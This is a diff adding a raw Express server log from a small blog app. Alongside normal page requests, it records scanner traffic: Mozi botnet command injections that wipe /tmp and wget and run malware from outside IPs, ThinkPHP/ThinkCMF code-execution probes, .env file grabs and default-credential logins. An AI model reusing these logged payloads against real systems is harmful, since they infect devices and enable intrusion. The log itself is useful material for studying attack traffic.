@@ -1,0 +1,175 @@
+
+> blogger@0.0.0 start /home/bitnami/blogger
+> node ./bin/www
+
+[0mGET / [36m304 [0m11.329 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m1.167 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m0.605 ms - -[0m
+[0mGET /js/bootstrap.min.js [36m304 [0m1.097 ms - -[0m
+[0mGET /js/jquery.min.js [36m304 [0m1.294 ms - -[0m
+[0mGET /bloglist [36m304 [0m1.581 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.548 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m0.517 ms - -[0m
+[0mGET /js/jquery.min.js [36m304 [0m0.629 ms - -[0m
+[0mGET /js/bootstrap.min.js [36m304 [0m0.536 ms - -[0m
+[0mGET / [36m304 [0m2.014 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.512 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m0.510 ms - -[0m
+[0mGET /js/jquery.min.js [36m304 [0m0.634 ms - -[0m
+[0mGET /js/bootstrap.min.js [36m304 [0m0.527 ms - -[0m
+[0mGET / [36m304 [0m1.249 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.537 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m0.550 ms - -[0m
+[0mGET /js/jquery.min.js [36m304 [0m0.655 ms - -[0m
+[0mGET /js/bootstrap.min.js [36m304 [0m0.696 ms - -[0m
+[0mGET / [36m304 [0m1.277 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.486 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m0.529 ms - -[0m
+[0mGET /js/jquery.min.js [36m304 [0m1.863 ms - -[0m
+[0mGET /js/bootstrap.min.js [36m304 [0m0.879 ms - -[0m
+[0mGET /bloglist [36m304 [0m1.362 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.465 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m0.499 ms - -[0m
+[0mGET /js/jquery.min.js [36m304 [0m0.600 ms - -[0m
+[0mGET /js/bootstrap.min.js [36m304 [0m0.550 ms - -[0m
+[0mGET /blogadd [36m304 [0m1.422 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.471 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m0.477 ms - -[0m
+[0mGET /bloglist [36m304 [0m1.072 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.472 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m0.477 ms - -[0m
+[0mGET /js/jquery.min.js [36m304 [0m0.611 ms - -[0m
+[0mGET /js/bootstrap.min.js [36m304 [0m0.464 ms - -[0m
+[0mGET / [36m304 [0m1.018 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.470 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m0.480 ms - -[0m
+[0mGET /js/jquery.min.js [36m304 [0m0.593 ms - -[0m
+[0mGET /js/bootstrap.min.js [36m304 [0m0.458 ms - -[0m
+[0mGET / [36m304 [0m0.994 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.430 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m0.445 ms - -[0m
+[0mGET /js/jquery.min.js [36m304 [0m2.010 ms - -[0m
+[0mGET /js/bootstrap.min.js [36m304 [0m0.876 ms - -[0m
+[0mGET / [32m200 [0m1.182 ms - 874[0m
+[0mGET / [32m200 [0m0.996 ms - 874[0m
+[0mGET /stylesheets/style.css [32m200 [0m2.482 ms - 226[0m
+[0mGET /js/bootstrap.min.js [32m200 [0m1.457 ms - 60044[0m
+[0mGET /js/jquery.min.js [32m200 [0m1.964 ms - 89476[0m
+[0mGET /css/bootstrap.min.css [32m200 [0m0.702 ms - 160302[0m
+[0mGET /bloglist [32m200 [0m0.992 ms - 878[0m
+[0mGET /stylesheets/style.css [36m304 [0m1.382 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m1.051 ms - -[0m
+[0mGET /js/bootstrap.min.js [36m304 [0m1.100 ms - -[0m
+[0mGET /js/jquery.min.js [36m304 [0m2.203 ms - -[0m
+[0mGET /blogadd [32m200 [0m1.265 ms - 736[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m0.495 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.324 ms - -[0m
+[0mGET /bloglist [36m304 [0m1.114 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m0.506 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.553 ms - -[0m
+[0mGET /js/bootstrap.min.js [36m304 [0m1.463 ms - -[0m
+[0mGET /js/jquery.min.js [36m304 [0m2.261 ms - -[0m
+[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m2.961 ms - 913[0m
+[0mGET / [32m200 [0m1.072 ms - 874[0m
+[0mHEAD / [32m200 [0m0.973 ms - 874[0m
+[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m1.300 ms - 913[0m
+[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://112.225.40.5:48652/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m1.445 ms - 913[0m
+[0mGET /config/getuser?index=0 [33m404 [0m0.959 ms - 913[0m
+[0mGET / [32m200 [0m0.921 ms - 874[0m
+[0mGET /.env [33m404 [0m0.939 ms - 913[0m
+[0mPOST / [33m404 [0m23.361 ms - 913[0m
+[0mGET / [32m200 [0m0.991 ms - 874[0m
+[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://27.7.230.186:52551/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m0.992 ms - 913[0m
+[0mGET /boaform/admin/formLogin?username=adminisp&psd=adminisp [33m404 [0m1.041 ms - 913[0m
+[0mGET /solr/admin/info/system?wt=json [33m404 [0m2.056 ms - 913[0m
+[0mGET / [32m200 [0m1.002 ms - 874[0m
+[0mGET / [32m200 [0m0.898 ms - 874[0m
+[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.941 ms - 874[0m
+[0mGET / [32m200 [0m0.941 ms - 874[0m
+[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.99.218.18:42867/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.987 ms - 913[0m
+[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.998 ms - 874[0m
+[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.955 ms - 913[0m
+[0mGET http://example.com/ [32m200 [0m0.964 ms - 874[0m
+[0mGET /t [33m404 [0m1.088 ms - 913[0m
+[0mGET / [32m200 [0m0.989 ms - 874[0m
+[0mGET / [32m200 [0m0.862 ms - 874[0m
+[0mGET /config/getuser?index=0 [33m404 [0m1.003 ms - 913[0m
+[0mGET / [32m200 [0m0.950 ms - 874[0m
+[0mHEAD / [32m200 [0m0.905 ms - 874[0m
+[0mGET / [32m200 [0m0.989 ms - 874[0m
+[0mGET /boaform/admin/formLogin?username=ec8&psd=ec8 [33m404 [0m1.020 ms - 913[0m
+[0mGET / [32m200 [0m0.948 ms - 874[0m
+[0mGET / [32m200 [0m0.868 ms - 874[0m
+[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.954 ms - 913[0m
+[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m1.058 ms - 874[0m
+[0mGET / [32m200 [0m1.051 ms - 874[0m
+[0mGET / [32m200 [0m1.813 ms - 874[0m
+[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.983 ms - 874[0m
+[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.870 ms - 913[0m
+[0mGET / [32m200 [0m0.938 ms - 874[0m
+[0mGET / [32m200 [0m0.943 ms - 874[0m
+[0mPOST /api/jsonws/invoke [33m404 [0m1.185 ms - 913[0m
+[0mGET /app/.env [33m404 [0m0.855 ms - 913[0m
+[0mPOST /app [33m404 [0m1.045 ms - 913[0m
+[0mGET / [32m200 [0m0.929 ms - 874[0m
+[0mGET /config/getuser?index=0 [33m404 [0m0.967 ms - 913[0m
+[0mGET /solr/admin/info/system?wt=json [33m404 [0m2.456 ms - 1195[0m
+Error: Failed to lookup view "error" in views directory "/home/bitnami/blogger/views"
+    at Function.render (/home/bitnami/blogger/node_modules/express/lib/application.js:580:17)
+    at ServerResponse.render (/home/bitnami/blogger/node_modules/express/lib/response.js:1008:7)
+    at /home/bitnami/blogger/app.js:44:7
+    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:71:5)
+    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
+    at /home/bitnami/blogger/node_modules/express/lib/router/index.js:284:7
+    at Function.process_params (/home/bitnami/blogger/node_modules/express/lib/router/index.js:335:12)
+    at next (/home/bitnami/blogger/node_modules/express/lib/router/index.js:275:10)
+    at /home/bitnami/blogger/app.js:33:3
+    at Layer.handle [as handle_request] (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:95:5)
+[0mGET /?XDEBUG_SESSION_START=phpstorm [31m500 [0m1.108 ms - 1232[0m
+Error: Failed to lookup view "error" in views directory "/home/bitnami/blogger/views"
+    at Function.render (/home/bitnami/blogger/node_modules/express/lib/application.js:580:17)
+    at ServerResponse.render (/home/bitnami/blogger/node_modules/express/lib/response.js:1008:7)
+    at /home/bitnami/blogger/app.js:44:7
+    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:71:5)
+    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
+    at /home/bitnami/blogger/node_modules/express/lib/router/index.js:284:7
+    at Function.process_params (/home/bitnami/blogger/node_modules/express/lib/router/index.js:335:12)
+    at next (/home/bitnami/blogger/node_modules/express/lib/router/index.js:275:10)
+    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:67:12)
+    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
+[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [31m500 [0m1.117 ms - 1232[0m
+Error: Failed to lookup view "error" in views directory "/home/bitnami/blogger/views"
+    at Function.render (/home/bitnami/blogger/node_modules/express/lib/application.js:580:17)
+    at ServerResponse.render (/home/bitnami/blogger/node_modules/express/lib/response.js:1008:7)
+    at /home/bitnami/blogger/app.js:44:7
+    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:71:5)
+    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
+    at /home/bitnami/blogger/node_modules/express/lib/router/index.js:284:7
+    at Function.process_params (/home/bitnami/blogger/node_modules/express/lib/router/index.js:335:12)
+    at next (/home/bitnami/blogger/node_modules/express/lib/router/index.js:275:10)
+    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:67:12)
+    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
+[0mGET / [31m500 [0m1.189 ms - 1232[0m
+Error: Failed to lookup view "error" in views directory "/home/bitnami/blogger/views"
+    at Function.render (/home/bitnami/blogger/node_modules/express/lib/application.js:580:17)
+    at ServerResponse.render (/home/bitnami/blogger/node_modules/express/lib/response.js:1008:7)
+    at /home/bitnami/blogger/app.js:44:7
+    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:71:5)
+    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
+    at /home/bitnami/blogger/node_modules/express/lib/router/index.js:284:7
+    at Function.process_params (/home/bitnami/blogger/node_modules/express/lib/router/index.js:335:12)
+    at next (/home/bitnami/blogger/node_modules/express/lib/router/index.js:275:10)
+    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:67:12)
+    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
+[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.991 ms - 1195[0m
+Error: Failed to lookup view "error" in views directory "/home/bitnami/blogger/views"
+    at Function.render (/home/bitnami/blogger/node_modules/express/lib/application.js:580:17)
+    at ServerResponse.render (/home/bitnami/blogger/node_modules/express/lib/response.js:1008:7)
+    at /home/bitnami/blogger/app.js:44:7
+    at Layer.handle_error (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:71:5)
+    at trim_prefix (/home/bitnami/blogger/node_modules/express/lib/router/index.js:315:13)
+    at /home/bitnami/blogger/node_modules/express/lib/router/index.js:284:7
+    at Function.process_params (/home/bitnami/blogger/node_modules/express/lib/router/index.js:335:12)
+    at next (/home/bitnami/blogger/node_modules/express/lib/router/index.js:275:10)
+    at /home/bitnami/blogger/app.js:33:3
+    at Layer.handle [as handle_request] (/home/bitnami/blogger/node_modules/express/lib/router/layer.js:95:5)
